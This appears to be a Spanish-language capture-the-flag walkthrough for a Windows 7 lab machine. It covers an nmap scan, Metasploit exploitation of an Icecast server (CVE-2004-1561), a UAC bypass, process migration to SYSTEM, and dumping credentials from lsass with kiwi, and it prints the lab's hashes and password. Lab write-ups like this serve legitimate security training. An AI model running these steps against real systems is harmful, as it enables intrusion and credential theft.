PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt

-Haciendo un Escaneo más exaustivo con nmap, encontramos el siguiente servicio vulnerable corriendo en el puerto 8000:
	PORT     STATE  SERVICE       VERSION
	8000/tcp open   http          Icecast streaming media server


-Buscamos en google Icecast streaming media server exploit y encontramos el siguiente CVE:
	CVE-2004-1561

-Lo buscamos en la consola de Metasploit, configuramos el exploit y obtenemos acceso a la máquina:
	search CVE-2004-1561
	use 0
	show options
	set rhosts 
	set lhost 
	run
	C:\Program Files (x86)\Icecast2 Win32>

-Listamos la version de Windows del sistema:
	ver
	Microsoft Windows [Version 6.1.7601]
	
-Listamos carácteristicas de sistema para saber la arquitectura (El comando solo funciona en el meterpreter):
	meterpreter > sysinfo
	Computer        : DARK-PC
	OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
	Architecture    : x64
	System Language : en_US
	Domain          : WORKGROUP
	Logged On Users : 2
	Meterpreter     : x86/windows

# Escalada de Privilegios

-Vamos a hacer un reconocimiento con metasploit para que nos recomiende exploits para escalar los privilegios:
	meterpreter > run post/multi/recon/local_exploit_suggester
	
Encontramos el siguiente exploit:
	exploit/windows/local/bypassuac_eventvwr

-Nos salimos de la session de meterpreter para buscar el exploit de escalada de privilegios en la consola de Metasploit:
	Para salir del meterpreter: 
		background o Control + Z
	entramos en el exploit:
		msf6: use exploit/windows/local/bypassuac_eventvwr
	Se nos ha abierto una nueva session de Metasploit con privilegios elevados

-Enumeramos todos los privilegios disponibles en el contexto del usuario actual, con el siguiente comando:
	getprivs

-Encontramos el siguiente permiso, el cual permite a un usuario tomar la propiedad de objetos (como archivos, carpetas,etc) en el sistema, incluso si no tienen acceso directo a esos objetos inicialmente.
	SeTakeOwnershipPrivilege

-Ejecutamos el comando ps para ver los procesos que están corriendo. Observamos que algunos procesos son NT AUTHORITY\SYSTEM, ya que tenemos privilegios elevados (Aunque nuestro proceso no los tiene).

-El proceso lsass.exe es un componente crítico del sistema operativo Windows que gestiona la Autenticación de usuarios. Vamos a interactuar con el con la herramienta 'kiwi' para dumpear las contraseña de los usuarios.

-El proceso en el que estamos siempre que entramos a una máquina Windows es Powershell.exe.

-Para elevar privilegios e interactuar con ldass, tenemos que migrar a un proceso que sea de la misma estructura (x64) y tenga los mismos privilegios (NT AUTHORITY\SYSTEM).

-Vamos a migrar al proceso 'spoolsv.exe'. Para ello tenemos 2 opciones:
	1-migrate + PID
		migrate 1280
	2-migrate -N PROCESS_NAME
		migrate -N spoolsv.exe
(Sirve cualquier proceso que sea x64 y NT AUTHORITY\SYSTEM)

Ya somos nt authority\system, para comprobarlo ejecutamos el siguiente comando:
	-En meterpreter:
		meterpreter > getuid
		Server username: NT AUTHORITY\SYSTEM
	-En shell:
		whoami
		C:\Windows\system32>whoami
		whoami
		nt authority\system

-Ahora que somos usuario administrador, vamos a dumpear las contraseñas de los usuarios del sistema, para ello vamos a utilizar la herramienta 'Kiwi', que es la versión actualizada de 'mimikatz'. Lo hacemos en meterpreter:
	meterpreter > load kiwi
Vemos las opciones de la herramienta:
	meterpreter > help
Encontramos el siguiente comando, para listar las contraseñas de todos los usuarios de la máquina:
	creds_all

meterpreter > creds_all

Username  Domain   LM 
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

Username  Domain     Password
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!





